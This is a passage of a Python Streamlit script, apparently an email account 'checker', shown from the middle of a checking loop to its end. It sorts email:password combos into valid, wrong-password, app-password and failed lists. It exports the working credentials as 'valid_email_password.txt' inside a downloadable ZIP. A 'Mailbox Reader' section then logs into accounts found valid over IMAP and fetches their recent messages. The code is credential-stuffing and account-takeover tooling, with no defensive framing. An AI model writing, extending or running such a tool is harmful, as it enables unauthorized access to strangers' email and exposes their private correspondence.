                            with session_state_lock:
                                if em_val:
                                    str_lit.session_state.checked_emails_set.add(em_val)

                                if st_val == "valid":
                                    str_lit.session_state.valid_results.append(res["line"])
                                elif st_val == "wrong_password":
                                    str_lit.session_state.wrong_results.append(res["line"])
                                elif st_val == "need_app_password":
                                    str_lit.session_state.need_app_results.append(res["line"])
                                else:
                                    str_lit.session_state.conn_results.append(res["line"])
                                
                                log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
                                str_lit.session_state.log_lines.append(log_msg)
                                if len(str_lit.session_state.log_lines) > 50:
                                    str_lit.session_state.log_lines.pop(0)
                                
                                trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
                                cred_combo = f"{res.get('email', '')}:{res.get('password', '')}" if res.get('password') else res.get('email', '')
                                str_lit.session_state.report_entries.append({
                                    "Time": datetime.now().strftime("%H:%M:%S"),
                                    "Email:Password": cred_combo,
                                    "Status": st_val.upper(),
                                    "Under-The-Hood Background Trace": f"Result: {res.get('detail', '')}\nSteps Executed:\n  ↳ {trace_text}"
                                })

                                valid_len = len(str_lit.session_state.valid_results)
                                wrong_len = len(str_lit.session_state.wrong_results)
                                need_len = len(str_lit.session_state.need_app_results)
                                conn_len = len(str_lit.session_state.conn_results)
                                current_logs = list(str_lit.session_state.log_lines)
                                current_reports = list(str_lit.session_state.report_entries)

                            time.sleep(0.01)

                            if index % 1 == 0 or checked_count == total_accs:
                                log_container.code("\n".join(current_logs), language="text")
                                
                                with report_metrics_placeholder.container():
                                    r_col1, r_col2, r_col3, r_col4 = str_lit.columns(4)
                                    r_col1.metric("✅ Valid", valid_len)
                                    r_col2.metric("❌ Wrong", wrong_len)
                                    r_col3.metric("🔑 AppPass", need_len)
                                    r_col4.metric("⚠ Failed", conn_len)

                                df_report = pd.DataFrame(current_reports[::-1])
                                report_log_container.dataframe(df_report, width='stretch', height=300)
                            
                    except Exception as ex:
                        err_msg = f"[EXCEPTION] {str(ex)}"
                        with session_state_lock:
                            str_lit.session_state.conn_results.append(err_msg)
                            str_lit.session_state.log_lines.append(err_msg)
                            current_logs = list(str_lit.session_state.log_lines)
                        log_container.code("\n".join(current_logs), language="text")
                    
                    if total_accs > 0:
                        pct = min(1.0, checked_count / total_accs)
                        progress_bar.progress(pct, text=f"Checking accounts [{engine_action_mode}]: {checked_count}/{total_accs} completed ({int(pct*100)}%)")
                    with session_state_lock:
                        v_len = len(str_lit.session_state.valid_results)
                        w_len = len(str_lit.session_state.wrong_results)
                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len}")
        except Exception as ex:
            str_lit.error(f"Execution thread block error: {ex}")

        end_dt = datetime.now()
        duration = end_dt - start_dt

        with session_state_lock:
            str_lit.session_state.run_completion_status = "Successful"
            str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
            
            valid_snapshot = list(str_lit.session_state.valid_results)
            wrong_snapshot = list(str_lit.session_state.wrong_results)
            need_snapshot = list(str_lit.session_state.need_app_results)
            conn_snapshot = list(str_lit.session_state.conn_results)

        progress_bar.progress(1.0, text="Checking complete!")
        status_text.success(f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}")
        log_startup(f"Live checking engine execution completed successfully. Duration: {str_lit.session_state.total_duration}")
        
        try:
            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")

            try:
                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
            except OSError as dir_err:
                warnings.warn(f"Filesystem permission/creation error: {dir_err}")

            with file_write_lock:
                try:
                    with open(valid_path, "w", encoding="utf-8") as f:
                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
                        f.write("\n".join(str(item) for item in valid_snapshot) + ("\n" if valid_snapshot else ""))
                    with open(wrong_path, "w", encoding="utf-8") as f:
                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
                        f.write("\n".join(str(item) for item in wrong_snapshot) + ("\n" if wrong_snapshot else ""))
                    with open(need_path, "w", encoding="utf-8") as f:
                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
                        f.write("\n".join(str(item) for item in need_snapshot) + ("\n" if need_snapshot else ""))
                    with open(failed_path, "w", encoding="utf-8") as f:
                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
                        f.write("\n".join(str(item) for item in conn_snapshot) + ("\n" if conn_snapshot else ""))
                except IOError as io_err:
                    warnings.warn(f"Disk-write error saving result logs: {io_err}")

            clean_valid_path = "clean_valid_accounts.txt"
            temp_clean_count = 0
            with file_write_lock:
                try:
                    with open(clean_valid_path, "w", encoding="utf-8") as outfile:
                        outfile.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
                        for line in valid_snapshot:
                            try:
                                if ":" in line:
                                    email, remainder = line.split(":", 1)
                                    email = email.strip()
                                    password_part = remainder.split("|")[0].strip()
                                    outfile.write(f"{email}:{password_part}\n")
                                    temp_clean_count += 1
                            except Exception:
                                continue
                except IOError as io_err:
                    warnings.warn(f"Disk-write error saving clean valid accounts: {io_err}")

            zip_output_name = f"mail_results_{stamp}.zip"
            try:
                with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
                    if os.path.exists(clean_valid_path):
                        z.write(clean_valid_path, arcname="valid_email_password.txt")
                    if os.path.exists(wrong_path):
                        z.write(wrong_path, arcname=os.path.basename(wrong_path))
                    if os.path.exists(need_path):
                        z.write(need_path, arcname=os.path.basename(need_path))
                    if os.path.exists(failed_path):
                        z.write(failed_path, arcname=os.path.basename(failed_path))
            except (zipfile.BadZipFile, IOError, OSError) as zip_err:
                warnings.warn(f"Temporary ZIP archive compilation error: {zip_err}")

            zip_bytes_data = b""
            if os.path.exists(zip_output_name):
                try:
                    with open(zip_output_name, "rb") as fp:
                        zip_bytes_data = fp.read()
                except IOError as fp_err:
                    warnings.warn(f"Failed to read compiled ZIP archive: {fp_err}")

            with session_state_lock:
                str_lit.session_state.clean_valid_count = temp_clean_count
                str_lit.session_state.zip_name = zip_output_name
                str_lit.session_state.zip_bytes = zip_bytes_data

        except Exception as ex:
            str_lit.error(f"Error compiling results export files: {ex}")

# --- Render Persistent Results Permanently If Engine Has Run ---
if str_lit.session_state.engine_has_run:
    str_lit.markdown("---")
    with session_state_lock:
        status_label = "🎉 Check Complete!" if str_lit.session_state.run_completion_status == "Successful" else "⚠️ Unfinished"
        clean_count_val = str_lit.session_state.clean_valid_count
        wrong_len_val = len(str_lit.session_state.wrong_results)
        need_len_val = len(str_lit.session_state.need_app_results)
        conn_len_val = len(str_lit.session_state.conn_results)
        valid_res_copy = list(str_lit.session_state.valid_results)
        log_lines_copy = list(str_lit.session_state.log_lines)
        report_entries_copy = list(str_lit.session_state.report_entries)
        zip_bytes_copy = str_lit.session_state.zip_bytes
        zip_name_copy = str_lit.session_state.zip_name
        start_ts_copy = str_lit.session_state.start_timestamp
        end_ts_copy = str_lit.session_state.end_timestamp
        duration_copy = str_lit.session_state.total_duration

    str_lit.markdown(f"### 📊 Live Results Summary & ZIP Archive — **{status_label}**")
    
    if start_ts_copy and end_ts_copy:
        str_lit.info(f"⏱ **Checking Session Timestamps:** Started at **{start_ts_copy}** | Ended at **{end_ts_copy}** | Total Duration: **{duration_copy}**")
    
    col1, col2, col3, col4 = str_lit.columns(4)
    col1.metric("✅ Clean Valid", clean_count_val)
    col2.metric("❌ Wrong Password", wrong_len_val)
    col3.metric("🔑 App Password / 2FA", need_len_val)
    col4.metric("⚠ Connection Failed", conn_len_val)
    
    if valid_res_copy:
        str_lit.markdown("#### ✅ Valid Accounts Found:")
        for v in valid_res_copy:
            str_lit.code(v, language="text")

    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
    with exec_tab1_p:
        if log_lines_copy:
            str_lit.code("\n".join(log_lines_copy), language="text")
        else:
            str_lit.info("No logs available from previous run.")
            
    with exec_tab2_p:
        if report_entries_copy:
            df_report_persisted = pd.DataFrame(report_entries_copy[::-1])
            str_lit.dataframe(df_report_persisted, width='stretch', height=300)
        else:
            str_lit.info("No report logs available.")

    if zip_bytes_copy and zip_name_copy:
        str_lit.download_button(
            label="📦 Download All Results (.zip Package)",
            data=zip_bytes_copy,
            file_name=zip_name_copy,
            mime="application/zip"
        )

# --- 📬 Mailbox Reader Section ---
str_lit.markdown("---")
str_lit.markdown("### 📬 Mailbox Reader (Interactive Inbox Inspection)")
with session_state_lock:
    has_valid = bool(str_lit.session_state.valid_results)
    valid_results_snapshot = list(str_lit.session_state.valid_results)

if not has_valid:
    str_lit.info("Run the checker successfully to populate valid accounts for mailbox reading.")
else:
    valid_combo_options = []
    for item in valid_results_snapshot:
        try:
            if ":" in item:
                email_val, remainder = item.split(":", 1)
                email_val = email_val.strip()
                pass_val = remainder.split("|")[0].strip()
                valid_combo_options.append(f"{email_val}:{pass_val}")
        except Exception:
            continue

    if valid_combo_options:
        selected_combo = str_lit.selectbox("Select Valid Account to Read:", options=valid_combo_options)
        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", min_value=1, max_value=50, value=10, step=1)
        
        if str_lit.button("📖 Read Inbox Messages"):
            if selected_combo:
                parts = selected_combo.split(":", 1)
                acc_email = parts[0].strip()
                acc_pass = parts[1].strip()
                conf_servers = get_servers(acc_email)
                imap_hosts = conf_servers.get("imap", [])
                
                if not imap_hosts:
                    str_lit.error("No IMAP host available for this provider domain name.")
                else:
                    with str_lit.spinner(f"Connecting to IMAP and fetching inbox for {acc_email}..."):
                        success_read = False
                        fetched_msgs = []
                        for srv in imap_hosts:
                            msgs = read_mailbox_messages(acc_email, acc_pass, srv, limit=max_msgs)
                            if msgs and not any("Error reading mailbox" in m for m in msgs):
                                fetched_msgs = msgs
                                success_read = True
                                break
                            elif msgs:
                                fetched_msgs = msgs
                        
                        if success_read:
                            str_lit.success("Successfully retrieved recent messages from mailbox!")
                            for idx, m_content in enumerate(fetched_msgs, 1):
                                str_lit.markdown(f"**Message {idx}:**")
                                str_lit.code(m_content, language="text")
                        else:
                            str_lit.warning(f"Could not read mailbox: {fetched_msgs}")
